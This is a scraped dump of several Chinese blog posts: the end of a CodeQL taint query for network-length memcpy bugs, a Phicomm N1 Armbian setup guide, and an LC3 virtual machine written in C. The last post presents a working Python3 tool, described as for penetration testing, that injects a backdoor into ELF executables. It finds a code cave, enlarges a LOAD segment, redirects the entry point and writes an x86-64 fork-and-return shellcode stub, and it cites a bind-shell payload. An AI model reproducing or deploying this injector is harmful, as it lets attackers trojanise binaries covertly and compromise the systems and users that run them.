NetworkByteSwap extends Expr { NetworkByteSwap() { exists(MacroInvocation mi | mi.getMacroName().regexpMatch(\u0026quot;ntoh(s|l|ll)\u0026quot;) and this = mi.getExpr() ) } } class Config extends TaintTracking::Configuration { Config() { this = \u0026quot;NetworkToMemFuncLength\u0026quot; } override predicate isSource(DataFlow::Node source) { source.asExpr() instanceof NetworkByteSwap } override predicate isSink(DataFlow::Node sink) { exists(FunctionCall call | call.getTarget().getName() = \u0026quot;memcpy\u0026quot; and sink.asExpr() = call.getArgument(2) and not call.getArgument(1).isConstant() ) } } from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink, source, sink, \u0026quot;Network byte swap flows to memcpy\u0026quot; 点击查询结果就可以跳转到代码位置，以进行详细分析。\n这里就是 Github 展示的漏洞，对 nfs 请求的回复长度未经过校验，导致可以控制 nfs_path 的 2048 字节。\nrefs CodeQL 教程 https://help.semmle.com/QL/learn-ql/\n","date":"2020-04-20","permalink":"https://chenx6.github.io/post/codeql/","tags":["re","codeql"],"title":"CodeQL 体验"},{"content":"最近想搞一台小服务器来做 Git 服务器，下载 Bt 等事情，所以就在一堆便宜的 ARM 机顶盒/NAS 中间挑选。最后看上了 100 RMB 左右的斐讯 N1，因为 N1 不用拆机就可以刷机。\n准备工作 空 U 盘 HDMI 线 一台斐讯 N1 键盘，鼠标 可以试试没有 HDMI 线和键鼠进行安装，好像进入 U 盘中的镜像时会自动开启 sshd 服务。\n安装系统 基本分为三个步骤：\n将 N1 降级 插入带有镜像的 U 盘，然后使用 adb shell reboot update 进入 U 盘镜像中的系统 使用镜像中的脚本完成安装。 这部分可以看其他人的图文教程（忘了截图了\u0026hellip;）例如 https://www.cnblogs.com/HintLee/p/9866485.html 和 https://www.aptx.xin/phicomm-n1.html\nN1 降级 将 N1 的 USB 调试打开，然后用 webpad 的降级工具降级，工具运行完成后重启盒子的系统，虽然看起来版本号没有变，但是底层的版本号确实降级了。\n镜像安装 首先是去找镜像。恩山上的帖子感觉有点复古，所以我就去外网找到了这个帖子：https://forum.armbian.com/topic/7930-armbian-for-amlogic-s9xxx-kernel-5x/，但是这里面提供的镜像竟然是 rc 版本的，于是就又去 https://forum.armbian.com/topic/12162-single-armbian-image-for-rk-aml-aw/ 找到了三种芯片合一镜像。虽然镜像解压出来有 5G 大小，但是这个 build 比较新，是 2 月 20 日左右编译的。我选择了 \u0026ldquo;Armbian_20.05.0-trunk_Arm-64_buster_current_5.5.1_20200227.img\u0026rdquo; 这个不带桌面的 Debian buster 系统的镜像。网盘地址：https://yadi.sk/d/_rQgn_FosYuW0g\n其次是刻录 U 盘，这里推荐 rufus，绿色版文件不到 10 MB。操作也非常简单。\n刻录完成后打开 \u0026ldquo;BOOT\u0026rdquo; 分区，修改 \u0026ldquo;uEnv.txt\u0026rdquo;。将 \u0026ldquo;# aml s9xxx\u0026rdquo; 下面几行行去除注释，将下一行改成 N1 的 dtb 文件路径。\n最后是惊险刺激的安装环节。在 adb 连接上盒子后，执行 adb shell reboot update ，然后迅速插入 U 盘，可以看到 U 盘中的 Debian 开始启动。\n这里有个坑点，如果是 USB 3.0 的 U 盘的话可能无法进入 U 盘中的系统，而是进入了 Recovery。导致前面情况的原因可能是盒子的供电不足，需要使用盒子上的另一个 USB 口对盒子进行供电。将 USB Type A 的双头线将电脑和盒子进行连接即可解决问题。\n先输入用户名 \u0026ldquo;root\u0026rdquo; 和默认密码 \u0026ldquo;1234\u0026rdquo; 登录系统后进行修改 root 用户的密码，新建普通用户。最后执行 \u0026ldquo;./install-aml.sh\u0026rdquo; 进行安装。\n系统配置 安装完成后重启，拔出 U 盘，即可使用之前创建的用户登录系统。\n连接 WIFI 然后执行 sudo nmtui，使用 \u0026ldquo;nmtui\u0026rdquo; 进行配置网络。在 TUI 中使用键盘的方向键控制选项，使用回车进行确定，使用 Esc 进行返回。\n选择 \u0026ldquo;Activate a connection\u0026rdquo; 就可以在 TUI 中连接 WIFI 了。选择网络，输入密码，连接网络一气呵成。\n配置 apt 源 还得配置下 apt 源。我用的 sudo sed \u0026quot;s/\\/\\/.*debian.org/\\/\\/mirrors.tuna.tsinghua.edu.cn/g\u0026quot; /etc/apt/sources.list -i 进行修改 apt 源。先去掉命令最后的 -i 选项，看看文件是否正确修改，然后加上 -i 选项进行修改。\n启动 sshd 最后看一下 sshd 是否启动：sudo systemctl status sshd\n如果没启动，那就 sudo systemctl start sshd 进行启动，然后在用电脑的 ssh 连接上盒子。当然，用 JuiceSSH 或者 Termux 连接也行。\n配置相应的软件（未完） aria2：HTTP/Bt 下载 先安装上 aria2 sudo apt update \u0026amp;\u0026amp; sudo apt install aria2\n然后在相应目录配置好 $HOME/.aria2/aria2.conf 还有 systemd 的 unit。我将通过 systemd 来实现开机启动 aria2。\n由于在 aria2 的配置文件中设置了 save-session，所以得将 save-session 后面所指定的文件 touch 创建出来，要不然会报错。\nsystemd 对于非 Linux 用户不太友好，但是对 Linux 用户来说还是方便啊。\n最后使用 systemd --user enable aria2.service \u0026amp;\u0026amp; systemd --user start aria2.service 启动 aria2。\n这个 service 会随着用户的退出而退出，所以要将当前用户设置为驻留用户：loginctl enable-linger $USER，这样就能实现开机启动，用户登出时不退出服务了。\n","date":"2020-02-01","permalink":"https://chenx6.github.io/post/n1_modify/","tags":["arm","server"],"title":"斐讯 N1 折腾/避坑笔记"},{"content":"本文是根据 https://justinmeiners.github.io/lc3-vm 和 https://justinmeiners.github.io/lc3-vm/supplies/lc3-isa.pdf ISA 写出 LC3 VM 的实现过程。\n代码已上传到了 Github 上：https://github.com/chenx6/lc3-vm\nLC3 架构 内存 LC3 架构有 2^16 个地址，每个地址包含一个 word (2 byte, 16 bit)。是大端序存储。所以用 C 表示如下。\nuint16_t *memory = malloc(UINT16_MAX * sizeof(uint16_t));\r指令 指令长度为固定 16 bit (不定长的 x86 出来挨打)。12-15 bit 用于表示 opcode，其他部分则是根据 opcode 来发挥其用途。下面是使用枚举类型表示出 LC3 指令的 opcode。\nenum Opcode\r{\rOP_BR = 0, /* branch */\rOP_ADD, /* add */\rOP_LD, /* load */\rOP_ST, /* store */\rOP_JSR, /* jump register */\rOP_AND, /* bitwise and */\rOP_LDR, /* load register */\rOP_STR, /* store register */\rOP_RTI, /* unused */\rOP_NOT, /* bitwise not */\rOP_LDI, /* load indirect */\rOP_STI, /* store indirect */\rOP_JMP, /* jump/ret */\rOP_RES, /* reserved (unused) */\rOP_LEA, /* load effective address */\rOP_TRAP /* execute trap */\r};\r寄存器 LC3 有三种寄存器，通用寄存器 (R0-R7)，指令计数器 (PC)，条件寄存器 (COND)。\n条件寄存器则是存储着三种状态：负数 (N)，零 (Z)，正 (P)。\n下面是使用枚举类型表示出寄存器的下标，还有条件寄存器的条件。\n枚举类型的最后一个无实际价值，只是用来表示寄存器的数量\nenum Register\r{\rR_R0 = 0, /* General purpose registers */\rR_R1,\rR_R2,\rR_R3,\rR_R4,\rR_R5,\rR_R6, /* User Stack Pointer */\rR_R7,\rR_PC, /* Program counter */\rR_COND, /* Condition codes */\rR_COUNT /* Counter */\r};\renum Condition\r{\rFL_POS = 1 \u0026lt;\u0026lt; 0, /* Positive */\rFL_ZRO = 1 \u0026lt;\u0026lt; 1, /* Zero */\rFL_NEG = 1 \u0026lt;\u0026lt; 2, /* Negative */\r};\r其他 LC3 还有中断，内存映射的 IO，优先级等。\n在 LC3 中有个类似 x86 int 的 TRAP，实现输入输出等功能。\nenum Trap\r{\rTRAP_GETC = 0x20, /* get character from keyboard */\rTRAP_OUT = 0x21, /* output a character */\rTRAP_PUTS = 0x22, /* output a word string */\rTRAP_IN = 0x23, /* input a string */\rTRAP_PUTSP = 0x24, /* output a byte string */\rTRAP_HALT = 0x25 /* halt the program */\r};\r在内存中映射的寄存器，可以通过内存地址进行访问，这里可以访问内存知道当前键盘按下与否，按下的按键，还有输出状态的功能。\nenum Memory\r{\rMR_KBSR = 0xFE00, /* keyboard status */\rMR_KBDR = 0xFE02, /* keyboard data */\rMR_DSR = 0xFE04, /* display status */\rMV_DDR = 0xFE06, /* display data */\rMCR = 0xFFFE /* machine control */\r};\r虚拟机实现 虚拟机基本架构 原文将读取文件和解析指令耦合在了一起，并且将内存和寄存器都变成了全局变量，那样就不能同时跑多个虚拟机了。所以在我的实现中，将读取文件，和解析指令并执行进行了拆分，将存储内存和寄存器的数组从全局变量变成了动态内存，还从别的项目里偷了测试样例 https://github.com/viking/lc3-vm/，最后写个 CMake 来负责处理编译依赖。\n通过一个结构体表示虚拟机的状态 (内存和寄存器) 会方便管理一些。\ntypedef struct _vm_ctx\r{\ruint16_t *memory;\ruint16_t *regs;\r} vm_ctx;\rvm_ctx *init_vm(const char *path)\r{\rvm_ctx *curr_vm = malloc(sizeof(vm_ctx));\rcurr_vm-\u0026gt;memory = read_image(path);\rcurr_vm-\u0026gt;regs = malloc(sizeof(uint16_t) * R_COUNT);\r}\rvoid destory_vm(vm_ctx *curr_vm)\r{\rfree(curr_vm-\u0026gt;memory);\rfree(curr_vm-\u0026gt;regs);\rfree(curr_vm);\r}\r整个虚拟机先从参数指向的程序读取程序镜像，然后开始不断运行程序，直到虚拟机解析到相关 Trap 时终止程序运行。\nint main(int argc, char **argv)\r{\rvm_ctx *curr_vm;\rif (argc == 2)\r{\rcurr_vm = init_vm(argv[1]);\r}\relse\r{\rfprintf(stderr, \u0026quot;Usage: %s [program]\\n\u0026quot;, argv[0]);\rexit(-1);\r}\rint running = 1;\rwhile (running)\r{\rrunning = execute_inst(curr_vm);\r}\rdestory_vm(curr_vm);\rreturn 0;\r}\r读取程序 就是上面代码中出现的 read_image 函数。\n由于程序为大端序，而平时使用的 x86 PC 是小端序，所以在读取时需要将程序转换成小端序以方便后面的解析。\n我们通过 read_image 函数来将程序加载到内存中，并且转换为小端序的操作。\n/* change endianness */\ruint16_t swap16(uint16_t x)\r{\rreturn (x \u0026lt;\u0026lt; 8) | (x \u0026gt;\u0026gt; 8);\r}\ruint16_t *read_image(const char *path)\r{\rFILE *file = fopen(path, \u0026quot;rb\u0026quot;);\rif (!file)\r{\rprintf(\u0026quot;[-] Read error!\u0026quot;);\rreturn NULL;\r}\ruint16_t *memory = malloc(sizeof(INT16_MAX * sizeof(uint16_t)));\r/* the origin tells us where in memory to place the image */\ruint16_t origin;\rfread(\u0026amp;origin, sizeof(origin), 1, file);\rorigin = swap16(origin);\r/* we know the maximum file size so we only need one fread */\ruint16_t max_read = UINT16_MAX - origin;\ruint16_t *p = memory + origin;\rsize_t read = fread(p, sizeof(uint16_t), max_read, file);\r/* swap file content to little endian */\rwhile (read-- \u0026gt; 0)\r{\r*p = swap16(*p);\r++p;\r}\rfclose(file);\rreturn memory;\r}\r执行指令 执行指令前得解析指令格式，我们可以从前面的链接中拿到 ISA，根据上面的格式来进行解析。\nADD 例如 ADD 指令编码如下\n15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0\r+--------------------+--------+--------+--------+\r| 0| 0| 0| 1| DR | SR1 | 0| 00 | SR2 |\r+--------------------------------------+--------+\r| 0| 0| 0| 1| DR | SR1 | 1| imm5 |\r+--------------------+--------+-----------------+\r汇编格式\nADD DR, SR1, SR2\rADD DR, SR1, imm5\r描述\nIf bit [5] is 0, the second source operand is obtained from SR2. If bit [5] is 1, the second source operand is obtained by sign-extending the imm5 ﬁeld to 16 bits. In both cases, the second source operand is added to the contents of SR1 and the result stored in DR. The condition codes are set, based on whether the result is negative, zero, or positive.\n通过上面的资料可以知道 ADD 指令的编码的 12-15 bit 为 ADD 的 opcode 0001，9-11 bit 为目标寄存器 8-6 bit 为源寄存器 1。由指令的 bit [5] 第 5 个 bit 指定操作对象，一种操作对象为立即数，另一种操作对象是寄存器。\n所以根据分析写出如下代码，通过位操作取出目标寄存器和源寄存器的下标，或者取出立即数，通过下标访问不同寄存器进行计算。最后根据运算结果更新条件寄存器。\nswitch (op)\r{\rcase OP_ADD:\r/* using {} to declare varible in labels */\r{\ruint16_t dr = (instr \u0026gt;\u0026gt; 9) \u0026amp; 0x7;\ruint16_t sr1 = (instr \u0026gt;\u0026gt; 6) \u0026amp; 0x7;\ruint16_t is_imm = (instr \u0026gt;\u0026gt; 5) \u0026amp; 0x1; /* check the op2 is sr2 or imm */\rif (is_imm)\r{\ruint16_t imm5 = sign_extend(instr \u0026amp; 0x1F, 5);\rcurr_vm-\u0026gt;regs[dr] = curr_vm-\u0026gt;regs[sr1] + imm5;\r}\relse\r{\ruint16_t sr2 = instr \u0026amp; 0x7;\rcurr_vm-\u0026gt;regs[dr] = curr_vm-\u0026gt;regs[sr1] + curr_vm-\u0026gt;regs[sr2];\r}\rupdate_flags(dr, curr_vm-\u0026gt;regs);\r}\rbreak;\r/* ... */\r}\r取出立即数时需要注意立即数的长度为 5 bit，但是寄存器的长度为 16 bit。例如在长度为 4 bit 内使用补码表示 -1，则 0-3 bit 存储着 1111，直接转换为长度到 16 bit 时则和 31 0000000000001111 相等，造成混乱。这就需要对立即数进行扩展。\n/* convert to 16 bit with sign */\ruint16_t sign_extend(uint16_t num, int bit_count)\r{\rif ((num \u0026gt;\u0026gt; (bit_count - 1)) \u0026amp; 1)\r{\rnum |= (0XFFFF \u0026lt;\u0026lt; bit_count);\r}\rreturn num;\r}\r在进行完运算后，要根据结果将条件寄存器进行更新，这就是 update_flags 函数。\n/* using regs[index] to update flags */\rvoid update_flags(uint16_t index, uint16_t regs[])\r{\rif (regs[index] == 0)\r{\rregs[R_COND] = FL_ZRO;\r}\relse if (regs[index] \u0026gt;\u0026gt; 15)\r{\rregs[R_COND] = FL_NEG;\r}\relse\r{\rregs[R_COND] = FL_POS;\r}\r}\rLD 同样我们可以解析并执行 LD 语句的 C 语言代码。\n15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0\r+--------------------+--------------------------+\r| 0| 0| 1| 0| DR | PCoffset9 |\r+--------------------+--------------------------+\rLD 语句就是从 PC + 相对偏移得到地址后，从地址中取出值并赋予 DR。当然 pc_offset 又是需要进行扩展的。\ncase OP_LD:\r{\ruint16_t dr = (instr \u0026gt;\u0026gt; 9) \u0026amp; 0x7;\ruint16_t pc_offset = sign_extend(instr \u0026amp; 0x1ff, 9);\rcurr_vm-\u0026gt;regs[dr] = mem_read(curr_vm-\u0026gt;regs[R_PC] + pc_offset, curr_vm-\u0026gt;memory);\rupdate_flags(dr, curr_vm-\u0026gt;regs);\r}\rBR 而 BR 语句则是负责条件跳转，条件则为指令中的 9-11 bit 进行决定。例如指令中 N 位为 1，而且寄存器中的条件寄存器 N 也为 1，则跳转。N, P, Z 这三种条件可以自由组合，只要满足某一个条件就跳转。跳转表示为 PC 指针加上偏移值。\ncase OP_BR:\r{\ruint16_t n_flag = (instr \u0026gt;\u0026gt; 11) \u0026amp; 0x1;\ruint16_t z_flag = (instr \u0026gt;\u0026gt; 10) \u0026amp; 0x1;\ruint16_t p_flag = (instr \u0026gt;\u0026gt; 9) \u0026amp; 0x1;\ruint16_t pc_offset = sign_extend(instr \u0026amp; 0x1FF, 9);\rif ((n_flag \u0026amp;\u0026amp; (curr_vm-\u0026gt;regs[R_COND] \u0026amp; FL_NEG)) ||\r(z_flag \u0026amp;\u0026amp; (curr_vm-\u0026gt;regs[R_COND] \u0026amp; FL_ZRO)) ||\r(p_flag \u0026amp;\u0026amp; (curr_vm-\u0026gt;regs[R_COND] \u0026amp; FL_POS)))\r{\rcurr_vm-\u0026gt;regs[R_PC] += pc_offset;\r}\r}\rmem_read 函数 由于有内存映射的寄存器的存在，所以要将访问某些特殊地址时实际上是想访问某些寄存器，所以在读写特殊内存地址时要进行魔改。例如在访问 MR_KBSR 地址时候就需要将按键状态返回。\nuint16_t mem_read(uint16_t address, uint16_t *memory)\r{\r/* reading the memory mapped keyboard register triggers a key check */\rif (address == MR_KBSR)\r{\rif (check_key())\r{\rmemory[MR_KBSR] = (1 \u0026lt;\u0026lt; 15);\rmemory[MR_KBDR] = getchar();\r}\relse\r{\rmemory[MR_KBSR] = 0;\r}\r}\rreturn memory[address];\r}\rcheck_key 函数用于将按键状态返回给程序。首先将 STDIN 绑定到集合中，然后通过 select 函数监视文件描述符的状态，如果有按键输入，则返回 1，否则返回 0；\n/* get keyboard status */\ruint16_t check_key()\r{\rfd_set readfds;\rFD_ZERO(\u0026amp;readfds);\rFD_SET(STDIN_FILENO, \u0026amp;readfds);\rstruct timeval timeout;\rtimeout.tv_sec = 0;\rtimeout.tv_usec = 0;\rreturn select(1, \u0026amp;readfds, NULL, NULL, \u0026amp;timeout) != 0;\r}\rTRAP 在处理中断时使用函数来进行处理，降低代码耦合度。\ncase OP_TRAP:\r{\rrunning = execute_trap(curr_vm, instr, stdin, stdout);\r}\rbreak;\rTrap 翻译 将不同中断用 C 语言表示就行。由 ISA 可以知道 Trap 向量由 0-7 bit 表示。上面已经提及过了 Trap 的路径和功能，所以相关功能使用 C 语言表示如下。\nswitch (instr \u0026amp; 0xFF)\r{\rcase TRAP_GETC:\r{\ruint16_t c = getc(in);\rcurr_vm-\u0026gt;regs[R_R0] = c;\r}\rbreak;\r/* ... */\r}\rbreak;\r虚拟机测试 通过位运算构造相应的指令，然后运行此指令，看看预期和结果是否相符。如果不相符就是挂了，返回 0；如果通过了那就返回 1。\nint test_add_1(vm_ctx *curr_vm)\r{\rint pass = 1;\ruint16_t add_instr =\r((OP_ADD \u0026amp; 0xf) \u0026lt;\u0026lt; 12) |\r((R_R0 \u0026amp; 0x7) \u0026lt;\u0026lt; 9) |\r((R_R1 \u0026amp; 0x7) \u0026lt;\u0026lt; 6) |\r(R_R2 \u0026amp; 0x7);\rcurr_vm-\u0026gt;memory[0x3000] = add_instr;\rcurr_vm-\u0026gt;regs[R_R1] = 1;\rcurr_vm-\u0026gt;regs[R_R2] = 2;\rint result = execute_inst(curr_vm);\rif (result != 1)\r{\rprintf(\u0026quot;Expected return value to be 1, got %d\\n\u0026quot;, result);\rpass = 0;\r}\rif (curr_vm-\u0026gt;regs[R_R0] != 3)\r{\rprintf(\u0026quot;Expected register 0 to contain 3, got %d\\n\u0026quot;, curr_vm-\u0026gt;regs[R_R0]);\rpass = 0;\r}\rif (curr_vm-\u0026gt;regs[R_COND] != FL_POS)\r{\rprintf(\u0026quot;Expected condition flags to be %d, got %d\\n\u0026quot;, FL_POS, curr_vm-\u0026gt;regs[R_COND]);\rpass = 0;\r}\rreturn pass;\r}\r通过将不同测试函数用指针数组装起来，不断调用，通过返回值判断测试样例是否通过。\nint test_env()\r{\rvm_ctx curr_vm;\rcurr_vm.regs = malloc(sizeof(uint16_t) * R_COUNT);\rcurr_vm.memory = malloc(UINT16_MAX * sizeof(uint16_t));\rint (*test_case[])(vm_ctx * curr_vm) = {test_add_1, test_add_2};\rint result = 1;\rint case_num = sizeof(test_case) / sizeof(uint16_t *);\rfor (int i = 0; i \u0026lt; case_num; i++)\r{\rcurr_vm.regs[R_PC] = 0x3000;\rmemset(curr_vm.memory, 0, UINT16_MAX);\rmemset(curr_vm.regs, 0, R_COUNT);\rresult = test_case[i](\u0026amp;curr_vm);\rif (result == 0)\r{\rprintf(\u0026quot;Test %d fail!\\n\u0026quot;, i);\rfree(curr_vm.memory);\rfree(curr_vm.regs);\rreturn result;\r}\relse if (result == 1)\r{\rprintf(\u0026quot;Test %d passed!\\n\u0026quot;, i);\r}\r}\rfree(curr_vm.memory);\rfree(curr_vm.regs);\rreturn result;\r}\r原文中还有编译好的 2048 和 rouge，可以试着跑一下。\n编译 使用 CMake 进行依赖处理，将测试程序和源程序分开，并且使用 make test 就可以跑测试了。\nif( POLICY CMP0048 )\rcmake_policy( SET CMP0048 NEW ) # CMake 3.0\rendif()\rproject( lc3-vm VERSION 0.1 )\rcmake_minimum_required( VERSION 2.6 )\rset( CMAKE_C_STANDARD 99 )\radd_library( read_image OBJECT lc3.h read_image.c )\radd_library( exec_inst OBJECT lc3.h exec_inst.c )\radd_executable( ${PROJECT_NAME} $\u0026lt;TARGET_OBJECTS:read_image\u0026gt; $\u0026lt;TARGET_OBJECTS:exec_inst\u0026gt; main.c )\radd_executable( ${PROJECT_NAME}-test $\u0026lt;TARGET_OBJECTS:read_image\u0026gt; $\u0026lt;TARGET_OBJECTS:exec_inst\u0026gt; test.c )\renable_testing()\radd_test(NAME ${PROJECT_NAME}-test COMMAND ./${PROJECT_NAME}-test )\rSET_TESTS_PROPERTIES( ${PROJECT_NAME}-test PROPERTIES\rPASS_REGULAR_EXPRESSION \u0026quot;All test passed!\u0026quot;\rFAIL_REGULAR_EXPRESSION \u0026quot;Test [\\\\d]+ fail!\u0026quot;\r)\rrefs 原文 https://justinmeiners.github.io/lc3-vm 这个 C 实现的虚拟机封装比较完整 https://github.com/rpendleton/lc3sim-c 这个实现里加了测试样例 https://github.com/viking/lc3-vm\n","date":"2020-01-15","permalink":"https://chenx6.github.io/post/lc3-vm/","tags":["vm"],"title":"LC3-VM 学习和实现"},{"content":"在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 \u0026ldquo;The backdoor factory\u0026rdquo; 已经不维护了，而且还是 Python2 写的，代码质量也\u0026hellip;所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况\u0026hellip;\n加后门的流程 基本分为两部分，先分析 ELF，然后根据之前的分析来给 ELF 加个\u0026quot;补丁\u0026quot;。\n先分析 ELF 结构，拿到 ELF File Header 和 ELF Program Headers (Segments) 的相关信息 通过 ELF Program Header 找到带有执行权限的 LOAD 段，看看这个 LOAD 段后有没有 Code Cave。即寻找不属于其他的 Section，ELF 文件为了对其 Segments 而填充的大量 0 字节。如果 Segment 末尾出现了一堆 0 字节填充，并且大小合适的话，则选择在这段空白处作为后门的插入点 扩充后门代码和辅助代码所在的 Segments 的 p_filesz 和 p_memsz，让后门代码得以加载进内存 将 ELF File Header 的 e_entry 指向后门代码，让后门代码可以运行 在空白处加入后门代码和相应的辅助代码 ELF 分析过程 介绍 ELF 结构的文章非常多，这里我推荐 UClib 的文档 ，里面讲了 ELF 的不同结构及其作用。有了这个文档后 ELF 文件的分析就非常简单了，可以使用 Python 的 struct 库来提取数据进行分析。首先通过 ELF File Header 获取到 e_phoff Program header 的文件偏移，然后 seek 到相应位置解析 Program header。\nclass elf_info: ''' This class will parse ELF file and get information from ELF file. ''' def __init__(self, file): self.file = file self.header = self._parse_header() self.segments = self._parse_segment() def _parse_header(self): ''' header parse part. ''' hdr = {} hdr['e_ident'] = unpack('4sccccc6sc', self.file.read(16)) hdr['e_type'], hdr['e_machine'] = unpack('\u0026lt;hh', self.file.read(4)) hdr['e_version'], = unpack('\u0026lt;I', self.file.read(4)) # Entry point virtual address hdr['e_entry'], = unpack('\u0026lt;Q', self.file.read(8)) # segment/section header file offset hdr['e_phoff'], hdr['e_shoff'] = unpack('\u0026lt;QQ', self.file.read(16)) # Processor-specific flags, ELF Header size in bytes hdr['e_flags'], hdr['e_ehsize'] = unpack('\u0026lt;Ih', self.file.read(6)) # Program header table entry size, Program header table entry count hdr['e_phentsize'], hdr['e_phnum'] = unpack('\u0026lt;hh', self.file.read(4)) # Section header table entry size, Section header table entry count hdr['e_shentsize'], hdr['e_shnum'] = unpack('\u0026lt;hh', self.file.read(4)) # Section header string table index hdr['e_shtrndx'], = unpack('\u0026lt;h', self.file.read(2)) return hdr def _parse_segment(self): ''' segment/program header parse part. ''' self.file.seek(self.header['e_phoff']) segments = [] for i in range(self.header['e_phnum']): seg = {} # Type of segment, Segment attributes seg['p_type'], seg['p_flags'] = unpack('\u0026lt;II', self.file.read(8)) # Offset in file seg['p_offset'], = unpack('\u0026lt;Q', self.file.read(8)) # Virtual address in memory, Reserved seg['p_vaddr'], seg['p_paddr'] = unpack('\u0026lt;QQ', self.file.read(16)) # Size of segment in file, Size of segment in memory seg['p_filesz'], seg['p_memsz'] = unpack('\u0026lt;QQ', self.file.read(16)) # Alignment of segment seg['p_align'], = unpack('\u0026lt;Q', self.file.read(8)) segments.append(seg) return segments ELF 补丁过程 下面是 Patch 程序的主要流程了，首先是找到合适大小的 Code Cave，然后修改 ELF File Header 和 ELF Program Header 为后门代码准备相应的内存，并让后门代码得以运行，最后往这个 Code Cave 里填上辅助代码和相应后门。\nclass injector: def __init__(self, file, inject_code: bytes): self.file = file self.info = elf_info(self.file) raw = [b'\\x6a\\x39', # push 0x39 b'\\x58', # pop rax b'\\x0f\\x05', # syscall b'\\x48\\x85\\xc0', # test rax, rax b'\\x74\\x12', # jz 16 b'\\xe8\\x00\\x00\\x00\\x00', # call $+5 b'\\x48\\x8b\\x2c\\x24', # mov rbp, [rsp] b'\\x48\\x81\\xed\\x00\\x00\\x00\\x00', # sub rbp, offset b'\\xff\\xe5', # jmp rbp inject_code] # inject code code = b''.join(raw) segs = self.find_cave(len(code)) if len(segs) == 0: logger.error('No cave in the program') return target_idx = segs[0]['index'] target = self.info.segments[target_idx] new_size = target['p_filesz'] + len(code) logger.info(f'Writing file/mem size to 0x{new_size:x}') self.extend_seg_size(target_idx, new_size) code_va = target['p_vaddr'] + target['p_filesz'] logger.info(f'Writing entry to 0x{code_va:x}') self.modify_entry(code_va) code_foffset = target['p_offset'] + target['p_filesz'] entry_offset = code_va + \\ len(b''.join(raw[:6])) - self.info.header['e_entry'] raw[7] = raw[7][:3] + pack('\u0026lt;I', entry_offset) logger.info(f'entry_offset == {entry_offset}') logger.info(f'Writing code to 0x{code_foffset:x}') self.add_machine_code(code_foffset, b''.join(raw)) 根据 ELF 信息，我们先寻找 ELF 文件中的 Cave。如果出现某个 LOAD Segment 的 \u0026lsquo;p_filesz\u0026rsquo; 和 \u0026lsquo;p_vaddr\u0026rsquo; 的和小于下一个 Segment 的 \u0026lsquo;p_vaddr\u0026rsquo;，那么很有可能在这个地方出现 Cave，通过遍历文件来验证这个 Segment 是否存在 Code Cave。\ndef verify_cave(self, start: int, len_: int) -\u0026gt; int: ''' Walking through file to verlify cave's size ''' self.file.seek(start) count = 0 while self.file.tell() \u0026lt; start + len_: b = self.file.read(1) if b == b'\\x00': count += 1 else: break return count def find_cave(self, need_size: int): ''' Find the cave in LOAD, exec segment cave means segment's file size is smaller than alloc size ''' load_segs = list(filter(lambda x: x['p_type'] == 1, self.info.segments)) if len(load_segs) \u0026lt;= 0: exit(1) cave_segs = [] for i in range(len(load_segs) - 1): c_seg = load_segs[i] n_seg = load_segs[i + 1] # Not a LOAD segments if not c_seg['p_flags'] \u0026amp; 1: continue # First verify max_range = c_seg['p_filesz'] + c_seg['p_vaddr'] if max_range \u0026gt;= n_seg['p_vaddr']: continue real_size = self.verify_cave(c_seg['p_offset'] + c_seg['p_filesz'], n_seg['p_vaddr'] - max_range) # cave size is too small if real_size \u0026lt;= need_size: continue logger.info(f'Found a {real_size} bytes cave') cave_segs.append({'index': self.info.segments.index(c_seg), 'cave_size': real_size}) return cave_segs 接下来就算 Patch 上 entry 和 Program Header，让辅助代码和后门得以载入内存并运行。Segment 的新 filesz 由 Segment 的旧 filesz + 注入代码长度 得到。而程序的新入口点则是由 Segment 的虚拟地址 + Segment 的旧filesz 得到。\nnew_size = target['p_filesz'] + len(code) logger.info(f'Writing file/mem size to 0x{new_size:x}') self.extend_seg_size(target_idx, new_size) code_va = target['p_vaddr'] + target['p_filesz'] logger.info(f'Writing entry to 0x{code_va:x}') self.modify_entry(code_va) def extend_seg_size(self, seg_pos: int, new_size: int): ''' Patch segment to increase LOAD file size ''' file_pos = self.info.header['e_phoff'] + \\ seg_pos * self.info.header['e_phentsize'] if self.info.header['e_machine'] == 62: file_pos += 32 # TODO: abstract elf types to adapt more architectures else: pass self.file.seek(file_pos) # TODO: static pack size self.file.write(pack('\u0026lt;Q', new_size) * 2) def modify_entry(self, new_entry: int): self.file.seek(24) self.file.write(pack('\u0026lt;Q', new_entry)) 然后是往 Code Cave 处加入辅助代码和后门。后门代码的位置由 目标 Segment 的文件偏移 + 目标 Segment 的文件大小 计算得到，辅助代码改动自 The backdoor factory。这里需要注意的是辅助代码的逻辑，首先是用 fork 创建子进程，如果当前程序是子进程的话，则执行后门，如果当前程序不是子进程的话，就通过计算当前指令地址和原 entry 的距离，以跳转到原程序的 entry。\nraw = [b'\\x6a\\x39', # push 0x39 b'\\x58', # pop rax b'\\x0f\\x05', # syscall b'\\x48\\x85\\xc0', # test rax, rax b'\\x74\\x12', # jz 16 b'\\xe8\\x00\\x00\\x00\\x00', # call $+5 b'\\x48\\x8b\\x2c\\x24', # mov rbp, [rsp] b'\\x48\\x81\\xed\\x00\\x00\\x00\\x00', # sub rbp, offset b'\\xff\\xe5', # jmp rbp inject_code] # inject code code = b''.join(raw) code_foffset = target['p_offset'] + target['p_filesz'] entry_offset = code_va + \\ len(b''.join(raw[:6])) - self.info.header['e_entry'] raw[7] = raw[7][:3] + pack('\u0026lt;I', entry_offset) logger.info(f'entry_offset == {entry_offset}') logger.info(f'Writing code to 0x{code_foffset:x}') self.add_machine_code(code_foffset, b''.join(raw)) def add_machine_code(self, pos: int, code: bytes): ''' Add code in the increased LOAD segments ''' self.file.seek(pos) self.file.write(code) 实战 首先先准备个傀儡，使用 gcc test.c -o test.elf 进行编译，由于辅助汇编代码对 The backdoor factory 进行了修改，所以位置无关代码也是可以 Patch 的。\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026quot;Hello, world!\\n\u0026quot;); return 0; } 我使用了 https://www.exploit-db.com/shellcodes/41128 的正向 Shell 代码，可以发现原程序正常运行，而后门代码也运行了。\n完整代码 由于代码太长了，所以我将代码放在了 gist 上了 